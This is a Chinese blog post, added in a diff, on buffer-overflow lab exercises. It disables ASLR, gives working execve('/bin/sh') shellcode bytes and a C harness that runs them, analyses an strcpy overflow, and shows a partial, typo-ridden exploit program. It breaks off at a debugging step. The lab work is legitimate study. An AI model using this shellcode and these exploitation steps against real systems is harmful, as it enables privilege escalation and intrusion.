@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_apple-touch-icon-human.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_human_32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_human_16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fushiye.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism-darcula","dark":"prism-darcula"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"giscus","storage":true,"lazyload":false,"nav":null,"activeClass":"giscus"},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":3,"unescape":false,"preload":true}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="buffer overflow 漏洞利用实践。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="经典缓冲区溢出实验1~6">
+<meta property="og:url" content="https://fushiye.github.io/2024/05/07/CS-%E7%BB%8F%E5%85%B8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C1-6/index.html">
+<meta property="og:site_name" content="星海拾贝">
+<meta property="og:description" content="buffer overflow 漏洞利用实践。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508200353.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508200607.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508201625.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508202822.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508202732.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203331.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203425.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203404.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203635.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203826.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203931.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203919.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508204222.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214646.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214809.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214849.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214919.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215250.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215323.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215336.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215600.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215741.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215840.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215914.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215934.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215959.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220041.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220200.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220209.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220326.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220335.png">
+<meta property="article:published_time" content="2024-05-07T13:16:25.000Z">
+<meta property="article:modified_time" content="2025-02-07T14:35:48.455Z">
+<meta property="article:author" content="Shearington">
+<meta property="article:tag" content="缓冲区溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508200353.png">
+
+
+<link rel="canonical" href="https://fushiye.github.io/2024/05/07/CS-%E7%BB%8F%E5%85%B8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C1-6/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fushiye.github.io/2024/05/07/CS-%E7%BB%8F%E5%85%B8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C1-6/","path":"2024/05/07/CS-经典缓冲区溢出实验1-6/","title":"经典缓冲区溢出实验1~6"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>经典缓冲区溢出实验1~6 | 星海拾贝</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">星海拾贝</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">探索永无止境</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">实验介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%90%8D%E7%A7%B0"><span class="nav-number">1.1.</span> <span class="nav-text">实验名称</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-number">1.2.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-number">1.3.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%AF%B4%E6%98%8E"><span class="nav-number">1.4.</span> <span class="nav-text">实验说明</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="nav-number">2.</span> <span class="nav-text">实验内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%87%86%E5%A4%87"><span class="nav-number">2.1.</span> <span class="nav-text">实验准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E4%B8%80"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞程序一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E4%BA%8C"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞程序二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E4%B8%89"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞程序三</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E5%9B%9B"><span class="nav-number">2.5.</span> <span class="nav-text">漏洞程序四</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E4%BA%94"><span class="nav-number">2.6.</span> <span class="nav-text">漏洞程序五</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E5%85%AD"><span class="nav-number">2.7.</span> <span class="nav-text">漏洞程序六</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Shearington"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">Shearington</p>
+  <div class="site-description" itemprop="description">诗酒趁年华</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Fushiye/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fushiye&#x2F;" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shearington@foxmail.com" title="E-Mail → mailto:shearington@foxmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fushiye.github.io/2024/05/07/CS-%E7%BB%8F%E5%85%B8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C1-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="Shearington">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星海拾贝">
+      <meta itemprop="description" content="诗酒趁年华">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="经典缓冲区溢出实验1~6 | 星海拾贝">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          经典缓冲区溢出实验1~6
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-05-07 21:16:25" itemprop="dateCreated datePublished" datetime="2024-05-07T21:16:25+08:00">2024-05-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-07 22:35:48" itemprop="dateModified" datetime="2025-02-07T22:35:48+08:00">2025-02-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8%E4%B8%8E%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">安全与实验</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>18 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>buffer overflow 漏洞利用实践。</p>
+<span id="more"></span>
+<h1 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h1><h2 id="实验名称"><a href="#实验名称" class="headerlink" title="实验名称"></a>实验名称</h2><p>buffer overflow 漏洞利用实践。</p>
+<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>编写 exploits 攻击漏洞程序，获取具有root权限的shell</p>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>【操作系统】</p>
+<p>Ubuntu16.04.07 LTS 32bit</p>
+<p>内核：4.15.0-112-generic</p>
+<p>【软件版本】</p>
+<p>gcc: 5.4.0</p>
+<p>make: 4.1</p>
+<h2 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h2><p>本次实验参考了</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lqerio/p/12870943.html">https://www.cnblogs.com/lqerio/p/12870943.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36779888/article/details/89684621?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_36779888/article/details/89684621?spm=1001.2014.3001.5502</a></p>
+<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p><strong>2.1.1 下载安装gdb-peda，prelink</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line">$ sudo echo &quot;source ~/peda/peda.py&quot; &gt;&gt;~/.gdbinit</span><br><span class="line">$ sudo apt-get install prelink</span><br></pre></td></tr></table></figure>
+<p>以后所有操作均在root用户下进行<br><strong>2.1.2 关闭保护机制</strong></p>
+<p>取消地址随机化(以下为临时关闭，重启会失效)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p>同时在编译时设置相应参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-fno-stack-protector：禁用堆栈溢出保护</span><br><span class="line">-z execstack：关闭数据溢出保护</span><br></pre></td></tr></table></figure>
+<p>2.1.3 安装漏洞程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulnerables</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<p><strong>2.1.3 分析shellcode构造</strong></p>
+<p>编写shellcode C代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char *buf [] = &#123;&quot;/bin/sh&quot;,NULL&#125;;</span><br><span class="line">void main()&#123;</span><br><span class="line">    execve(&quot;/bin/sh&quot;,buf,0);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>gcc编译后成功弹出shell:<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508200353.png" alt="20240508200353"></p>
+<p>对编译的二进制程序使用objdump反汇编</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d shellcode \&gt; shellcode.S</span><br></pre></td></tr></table></figure>
+<p>可见其对应汇编代码,编写汇编代码如下：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508200607.png" alt="20240508200607"><br>编译链接运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 shellcode.asm -o shellcode.o</span><br><span class="line">ld -m elf_i386 -o shellcode shellcode.o</span><br><span class="line">./shellcode</span><br></pre></td></tr></table></figure>
+
+<p>使用如下命令获取shellcode对应机器码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(objdump -d shellcode | grep &quot;^&quot; | cut -f2 ); do echo -n &#x27;\x&#x27;$i;done;</span><br></pre></td></tr></table></figure>
+<p>得到对应机器码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80</span><br></pre></td></tr></table></figure>
+<p>构造如下C程序test.c验证机器码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">void(*shellcode)();</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char * code[]=&quot;\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot;;</span><br><span class="line">    shellcode=(void(*)()) code;</span><br><span class="line">    shellcode();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译时关闭数据溢出保护和堆栈溢出保护<br>执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c -fno-stack-protector -z execstack</span><br><span class="line">./test</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出shell,说明机器码正确。<br>同时，查询到构造shell还有另一方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static const char shellcode[] =</span><br><span class="line">&quot;\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b&quot;</span><br><span class="line">&quot;\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd&quot;</span><br><span class="line">&quot;\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>同样编写程序验证，可成功引发shell。第一种方法使用了<code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], NULL)</code> 调用来执行 <code>/bin/sh</code>，通过栈来设置参数，实验过程中发现在构造vul2的exploit2时，会导致vul2的buf数组起始位置发生变化，而第二种方法通过寄存器设置参数，可以避免此问题，两种构造shell的机器码均记录下来，分别存储为<code>shllcode1.h</code>（第一种方法）,<code>shellcode.h</code>（第二种方法）</p>
+<h2 id="漏洞程序一"><a href="#漏洞程序一" class="headerlink" title="漏洞程序一"></a>漏洞程序一</h2><p><strong>2.2.1 漏洞分析</strong></p>
+<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508201625.png" alt="20240508201625"><br>分析：</p>
+<p>bar 函数中使用 strcpy 函数将 arg 拷贝到 out 中，这里的 out 是一个局部数组，大小为 256 字节。但strcpy 函数不会检查目标数组的大小，而是简单地将源字符串复制到目标地址，这可能导致缓冲区溢出：如果参数 arg 的长度超过了 out 的大小（256 字节），strcpy 将继续写入超出缓冲区 out 的部分，导致栈上的其他数据被覆盖。这种情况就是经典的栈溢出漏洞，因为溢出的数据会覆盖函数调用栈中重要的数据，如返回地址和函数参数，从而可能影响程序的控制流程和执行。同时，调用bar函数的foo 函数接受命令行参数 argv，并将 argv[1] 作为参数传递给 bar 函数，其中 argv[1] 是 main 函数中的命令行参数 argv 的第二个元素。这意味着，如果在命令行中提供的参数超过了程序预期的范围，就会导致 bar 函数试图将过长的字符串复制到 buf 中，从而造成缓冲区溢出。</p>
+<p>foo函数栈帧如下，当写入264字节时第261-264字节会覆盖原有返回地址。</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0xbffffd54</td>
+<td>return address</td>
+</tr>
+<tr>
+<td>0xbffffd50</td>
+<td>main’s ebp</td>
+</tr>
+<tr>
+<td>0xbffffd4c</td>
+<td>buf[255]</td>
+</tr>
+<tr>
+<td>...</td>
+<td>…</td>
+</tr>
+<tr>
+<td>0xbffffd54</td>
+<td>buf[0]</td>
+</tr>
+</tbody></table>
+<p><strong>2.2.2 构造payload</strong></p>
+<p>根据上述漏洞原理，构造payload，向buf中写入264字节的数据引起溢出，其中260~263为新的返回地址，即为写入shellcode机器码的开始地址，如下构造程序：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508202822.png" alt="20240508202822"><br>为避免图片无法显示，重要代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">#include&quot;shellcode.h&quot;</span><br><span class="line">...</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int return_addr = 0x00000000;</span><br><span class="line">    char payload[264];</span><br><span class="line">    emcpy(payload,shellcode,strlen(shellcode));</span><br><span class="line">    for(int i= strlen(shellcode);i&lt;260;i++&gt;)</span><br><span class="line">    payload[i]=0x90;</span><br><span class="line">    memcpy(&amp;payload[260],&amp;return_addr,4);</span><br><span class="line">    char *argv[]=&#123;TARGET,payload,NULL&#125;;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编译：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit1.c -o exploit1 -fno-stack-protector -z execstack</span><br></pre></td></tr></table></figure>
+<p>调试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -e ./exploiy1 -s /tmp/vul1 –directory=../vulnerables</span><br></pre></td></tr></table></figure>
+<p>开始调试后，依次执行以下调试命令：</p>
